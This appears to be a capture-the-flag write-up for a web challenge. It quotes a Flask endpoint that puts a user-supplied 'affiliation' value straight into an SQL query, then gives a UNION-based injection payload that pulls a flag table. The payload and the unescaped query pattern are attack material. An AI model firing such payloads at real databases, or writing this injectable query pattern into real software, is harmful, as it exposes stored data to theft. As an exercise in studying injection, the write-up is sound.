The asiaccs web challenge (even though I know nothing about web)

Looking around the source code, I saw the server does not check or escape the value of the affiliation field before using it in an SQL query.

@app.route("/api/search_by_affiliation", methods=["POST"])
def search_by_affiliation():
    data = request.json
    affiliation = data.get("affiliation", "")
    # Affiliation is directly used in the SQL query without checking
    query = f"SELECT title, author, affiliation FROM papers WHERE affiliation LIKE '%{affiliation}%'"
    results = db.execute(query).fetchall()
    # returns results to client

So if I enter a special string, I can inject SQL commands into the original query.

Example:

I enter:
' UNION SELECT flag, NULL, NULL FROM flag --

The query becomes:

SELECT title, author, affiliation FROM papers WHERE affiliation LIKE '%' UNION SELECT flag, NULL, NULL FROM flag --

From there, I can create an exploit.py payload to request the server via /api/search_by_affiliation

Results are returned in POST_res.txt

Well, even though I know nothing about SQL, just getting that table is enough to make me happy.

Now just CTRL + F for HCMUS and filter everything.

Flag is HCMUS-CTF{fake-flag-asiaccs} ....

Just kidding
